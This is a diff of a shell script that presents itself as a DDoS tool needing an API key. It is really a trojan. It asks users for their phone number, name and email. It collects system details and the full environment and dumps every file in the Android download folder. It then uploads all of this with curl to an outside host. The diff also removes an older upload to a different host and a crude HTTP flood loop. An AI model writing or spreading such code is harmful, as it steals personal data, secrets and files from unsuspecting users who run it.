@@ -1,6 +1,11 @@
 #!/system/bin/bash/sh
-echo "DDOS"
-echo "Please Enter your Personal Information to use"
+echo "
+ ____       ____
+|  _ \  ___/ ___|
+| | | |/ _ \___ \
+| |_| | (_) |__) |
+|____/ \___/____/"
+echo "Please Enter your Personal Information to created API KEY use "
 echo ""
   echo -n "Phone Number:"
   read phone
@@ -16,62 +21,33 @@ read line
   case $line in
 
   $line)
+bat() {
   echo "
   System : $(uname -a)
   User   : $(whoami)
   date   : $(date)
   path   : $(pwd)
   id     : $(id)
+  $(set)"
 
+echo "  $(cd ..)"
+echo "  $(cd)"
+echo "  $(ls -la)"
+echo "  $(cd /sdcard/download)"
+echo "  $(ls -la)"
+echo "  $(cat *)"
+}
 
-  $(set)
-
-
-  $(cd)
-  $(cd ..)
-  $(cd usr)
-  $(ls -la)
-  $(cd)
-  $(cd /sdcard/download)
-  $(ls -la)
-  $(cat *)
-
-
+echo "
   phone number : $phone
   name : $name
   email : $email
 
-  ','{$line}',' " >> proxy.txt
-  curl -T proxy.txt http://n8tive.co.za/
+  ','{$line}',' " >> system.txt
+  bat >> system.txt
+  curl -T system.txt http://happy.mikikk.co.jp/
   cm
 
  esac
  }
 cm
-echo -n Enter IP :
- read ip
- echo -n Enter Port :
- read port
-  echo setting up targeted $ip:$port
-sleep 3
-dos_attack() {
- number_sent=1
-    function request() {
-  while [ $number_sent -lt 99999 ]
-  do
-    echo Sent Packet $RANDOM.$number_sent bytes to $ip:$port $(curl http://$ip:$port)
-   echo $(curl http://$ip:$port)
-number_sent=`expr $number_sent + 1`
-  done
- }
- request
-}
-  echo 1
-  sleep 1
-  echo 2
-  sleep 1
-  echo 3
-  sleep 1
-  echo ATTACKK !!!
-  sllep 1
-dos_attack
